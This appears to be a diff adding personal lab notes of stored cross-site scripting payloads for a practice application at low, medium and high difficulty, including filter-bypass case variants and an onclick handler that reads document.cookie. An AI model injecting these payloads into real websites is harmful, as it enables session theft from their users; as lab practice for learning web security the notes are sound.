@@ -1,0 +1,23 @@
+# XSS-Stored (Difficulty: Low)
+
+<script>alert("You have been Hacked")</script>
+<script>alert(document.cookie)</script>
+
+
+
+
+# XSS-Stored (Difficulty: Medium)
+
+<sCript>alert(document.cookie)</script>
+<SCRIPT>alert(document.cookie)</script>     [Try it on "Name field", According to Source Code, it Doesn't check the ending Script]
+
+
+
+
+# XSS-Stored (Difficulty: High)
+
+<html onclick="alert(document.cookie)" style=display:block>test</html>
+
+
+
+Res: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
